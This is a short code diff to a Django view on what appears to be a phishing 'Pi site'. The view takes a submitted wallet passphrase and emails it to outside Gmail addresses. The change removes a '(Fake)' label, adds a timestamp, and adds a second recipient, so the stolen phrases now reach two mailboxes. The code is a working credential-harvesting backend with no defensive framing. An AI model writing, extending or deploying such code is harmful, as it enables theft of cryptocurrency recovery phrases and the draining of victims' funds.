@@ -5,6 +5,7 @@ from django.http import HttpResponse
 
 
 current_date = datetime.now()
+formatted_time = current_date.strftime("%Y-%m-%d %H:%M:%S")
 # Create your views here.
 
 
@@ -16,6 +17,9 @@ def send_notify(subject, payload, email_to):
     return sending_no(payload, recipient, sender,password, subject)
 
 def sendmail(request, keys):
-    send_notify(payload=f'Fake Pass Phrase submitted - the passphrase is -( {keys} )', subject=f'Pi site {current_date} Token Submitted(Fake)', email_to="ezekielobiajulu0@gmail.com")
+    print(formatted_time)
+    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="ezekielobiajulu0@gmail.com")
+                    
+    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
     
     return HttpResponse('done')
